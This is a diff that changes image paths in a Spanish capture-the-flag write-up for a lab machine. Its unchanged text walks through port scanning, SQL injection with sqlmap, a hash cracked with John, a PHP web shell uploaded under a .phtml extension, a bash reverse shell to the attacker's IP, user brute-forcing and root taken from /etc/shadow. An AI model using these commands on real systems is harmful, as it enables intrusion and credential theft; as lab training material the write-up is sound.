@@ -16,7 +16,7 @@ nmap -sS -p- -vvv -n -Pn --open -oN ports 172.17.0.2 --min-rate 5000
 
 Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:
 
-![Pasted image 20251102002609](Hacking-repo-obs/Anexos/Pasted%20image%2020251102002609.png)
+![Pasted image 20251102002609](../../../../Anexos/Pasted%20image%2020251102002609.png)
 
 Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:
 
@@ -24,11 +24,11 @@ Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión d
 nmap -sCV -p80 -n -Pn -vvv --min-rate 5000 -oN version 172.17.0.2
 ```
 
-![Pasted image 20251102002625](Hacking-repo-obs/Anexos/Pasted%20image%2020251102002625.png)
+![Pasted image 20251102002625](../../../../Anexos/Pasted%20image%2020251102002625.png)
 
 Solo hay un servicio web, así que vamos a ver de qué se trata:
 
-![Pasted image 20251102002702](Hacking-repo-obs/Anexos/Pasted%20image%2020251102002702.png)
+![Pasted image 20251102002702](../../../../Anexos/Pasted%20image%2020251102002702.png)
 
 En este punto vamos a aplicar fuzzing para descubrir directorios y archivos ocultos en la web:
 
@@ -36,33 +36,33 @@ En este punto vamos a aplicar fuzzing para descubrir directorios y archivos ocul
 gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,xml -o dirs.txt
 ```
 
-![Pasted image 20251102002845](Hacking-repo-obs/Anexos/Pasted%20image%2020251102002845.png)
+![Pasted image 20251102002845](../../../../Anexos/Pasted%20image%2020251102002845.png)
 
 Vemos que casi todos los recursos apuntan al login, así que vamos a enfocarnos en los que no, que son vendor, uploads e img. En el directorio uploads no hay nada. En el directorio imágenes hay unas fotos:
 
-![Pasted image 20251102003501](Hacking-repo-obs/Anexos/Pasted%20image%2020251102003501.png)
+![Pasted image 20251102003501](../../../../Anexos/Pasted%20image%2020251102003501.png)
 
 En el directorio vendor hay lo siguiente, y vamos a fijarnos en el recurso autoupload, ya que sugiere que alomejor podemos subir algo.
 
-![Pasted image 20251102003350](Hacking-repo-obs/Anexos/Pasted%20image%2020251102003350.png)
+![Pasted image 20251102003350](../../../../Anexos/Pasted%20image%2020251102003350.png)
 
 Vamos a acceder al directorio register.php para intentar crearnos una cuenta:
 
-![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251102004024.png)
+![800](../../../../Anexos/Pasted%20image%2020251102004024.png)
 
 Tras iniciar sesión, podemos ver la página de compras:
 
-![Pasted image 20251102004325](Hacking-repo-obs/Anexos/Pasted%20image%2020251102004325.png)
+![Pasted image 20251102004325](../../../../Anexos/Pasted%20image%2020251102004325.png)
 
 Vamos a simular una compra y probar algunas cosas.
 
 Al ver un campo de búsqueda y probar poner una comilla **'** veo que me arroja lo siguiente:
 
-![Pasted image 20251102005111](Hacking-repo-obs/Anexos/Pasted%20image%2020251102005111.png)
+![Pasted image 20251102005111](../../../../Anexos/Pasted%20image%2020251102005111.png)
 
 Como no consigo dar con nada, voy a probar interceptar la petición con burpsuite y luego tratarla con sqlmap. Vamos por pasos.
 
-![Pasted image 20251102013703](Hacking-repo-obs/Anexos/Pasted%20image%2020251102013703.png)
+![Pasted image 20251102013703](../../../../Anexos/Pasted%20image%2020251102013703.png)
 
 Después de interceptar esa petición, la guardo en un fichero llamado **search.txt**, y lo procesamos con sqlmap de la siguiente manera:
 
@@ -70,7 +70,7 @@ Después de interceptar esa petición, la guardo en un fichero llamado **search.
 sqlmap -r search.txt --dbs --batch 
 ```
 
-![Pasted image 20251102013745](Hacking-repo-obs/Anexos/Pasted%20image%2020251102013745.png)
+![Pasted image 20251102013745](../../../../Anexos/Pasted%20image%2020251102013745.png)
 
 ```bash
 sqlmap -u "http://172.17.0.2/mycart.php?search=" --level=5 --dbs --batch --cookie="PHPSESSID=ppe2g1p4n58b991sthrqrtgt3o" 
@@ -78,7 +78,7 @@ sqlmap -u "http://172.17.0.2/mycart.php?search=" --level=5 --dbs --batch --cooki
 
 Obtenemos lo siguiente, y usaremos esta opción para continuar:
 
-![Pasted image 20251102013427](Hacking-repo-obs/Anexos/Pasted%20image%2020251102013427.png)
+![Pasted image 20251102013427](../../../../Anexos/Pasted%20image%2020251102013427.png)
 
 Ahora, seleccionamos la base de datos apple_store con el parámetro -D y --tables
 
@@ -86,7 +86,7 @@ Ahora, seleccionamos la base de datos apple_store con el parámetro -D y --table
 sqlmap -u "http://172.17.0.2/mycart.php?search=1" --batch --cookie="PHPSESSID=ppe2g1p4n58b991sthrqrtgt3o" -D apple_store --tables
 ```
 
-![Pasted image 20251102014941](Hacking-repo-obs/Anexos/Pasted%20image%2020251102014941.png)
+![Pasted image 20251102014941](../../../../Anexos/Pasted%20image%2020251102014941.png)
 
 Ahora, añadimos el parámetro -T para referenciar la tabla USERS y luego el parámetro --dump para extraer el contenido:
 
@@ -94,12 +94,12 @@ Ahora, añadimos el parámetro -T para referenciar la tabla USERS y luego el par
 sqlmap -u "http://172.17.0.2/mycart.php?search=1" --batch --cookie="PHPSESSID=ppe2g1p4n58b991sthrqrtgt3o" -D apple_store -T users --dump
 ```
 
-![Pasted image 20251102020255](Hacking-repo-obs/Anexos/Pasted%20image%2020251102020255.png)
+![Pasted image 20251102020255](../../../../Anexos/Pasted%20image%2020251102020255.png)
 
 Bueno ya vemos las contraseñas, entre ellas la del usuario admin, que parece estar en formato SHA1, así que vamos a probar crackearla con Jhon the reaper.
 Primero creamos un archivo hash.txt con el contenido de la contraseña del admin:
 
-![800](Hacking-repo-obs/Anexos/Pasted%20image%2020251102021138.png)
+![800](../../../../Anexos/Pasted%20image%2020251102021138.png)
 
 ```bash
 echo -n "7f73ae7a9823a66efcddd10445804f7d124cd8b0" > hash.txt
@@ -107,23 +107,23 @@ echo -n "7f73ae7a9823a66efcddd10445804f7d124cd8b0" > hash.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-![Pasted image 20251102021235](Hacking-repo-obs/Anexos/Pasted%20image%2020251102021235.png)
+![Pasted image 20251102021235](../../../../Anexos/Pasted%20image%2020251102021235.png)
 
 Ahora accedemos al panel de admin de la web, y vemos un apartado de subida de archivos:
 
-![Pasted image 20251102021355](Hacking-repo-obs/Anexos/Pasted%20image%2020251102021355.png)
+![Pasted image 20251102021355](../../../../Anexos/Pasted%20image%2020251102021355.png)
 
 Al intentar subir un archivo php con un código malicioso para ejecutar comandos remotamente vemos que nos arroja el siguiente error:
 
-![Pasted image 20251102021458](Hacking-repo-obs/Anexos/Pasted%20image%2020251102021458.png)
+![Pasted image 20251102021458](../../../../Anexos/Pasted%20image%2020251102021458.png)
 
 Lo que vamos a hacer es interceptar la petición con burpsuite y probar subir el archivo cambiando algunas configuraciones:
 
-![Pasted image 20251102023310](Hacking-repo-obs/Anexos/Pasted%20image%2020251102023310.png)
+![Pasted image 20251102023310](../../../../Anexos/Pasted%20image%2020251102023310.png)
 
 Conseguimos subirlo usando la extensión **.phtml** y ahora solo debemos ir a la ruta **/uploads** y ejecutar un comando con el parámetro **id**:
 
-![Pasted image 20251102023229](Hacking-repo-obs/Anexos/Pasted%20image%2020251102023229.png)
+![Pasted image 20251102023229](../../../../Anexos/Pasted%20image%2020251102023229.png)
 
 Ahora, teniendo una RCE, vamos a entablar una reverse shell a nuestra máquina de atacante para tener mas comodidad:
 
@@ -131,17 +131,17 @@ Ahora, teniendo una RCE, vamos a entablar una reverse shell a nuestra máquina d
 http://172.17.0.2/uploads/shell.phtml?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.70.86/443 0>%261"
 ```
 
-![Pasted image 20251102023824](Hacking-repo-obs/Anexos/Pasted%20image%2020251102023824.png)
+![Pasted image 20251102023824](../../../../Anexos/Pasted%20image%2020251102023824.png)
 
 Después de probar varias cosas, sin éxito, ejecuto un script de bash para hacer fuerza bruta sobre el usuario luisillo_o, que lo localizamos también en la base de datos de la web. Conseguimos su contraseña:
 
-![Pasted image 20251102041246](Hacking-repo-obs/Anexos/Pasted%20image%2020251102041246.png)
+![Pasted image 20251102041246](../../../../Anexos/Pasted%20image%2020251102041246.png)
 
 Ahora veo que tengo permiso de lectura para el archivo /etc/shadow, y puedo copiar la contraseña para tratar de crackearla en local:
 
-![Pasted image 20251102041638](Hacking-repo-obs/Anexos/Pasted%20image%2020251102041638.png)
+![Pasted image 20251102041638](../../../../Anexos/Pasted%20image%2020251102041638.png)
 
-![Pasted image 20251102042200](Hacking-repo-obs/Anexos/Pasted%20image%2020251102042200.png)
+![Pasted image 20251102042200](../../../../Anexos/Pasted%20image%2020251102042200.png)
 
 Ahora con Jhon lo crackeamos:
 
@@ -149,11 +149,11 @@ Ahora con Jhon lo crackeamos:
 john --wordlist=/usr/share/wordlists/rockyou.txt root.txt --format=crypt
 ```
 
-![Pasted image 20251102042322](Hacking-repo-obs/Anexos/Pasted%20image%2020251102042322.png)
+![Pasted image 20251102042322](../../../../Anexos/Pasted%20image%2020251102042322.png)
 
 Nos conectamos y ya somos root:
 
-![Pasted image 20251102042406](Hacking-repo-obs/Anexos/Pasted%20image%2020251102042406.png)
+![Pasted image 20251102042406](../../../../Anexos/Pasted%20image%2020251102042406.png)
 
 
 
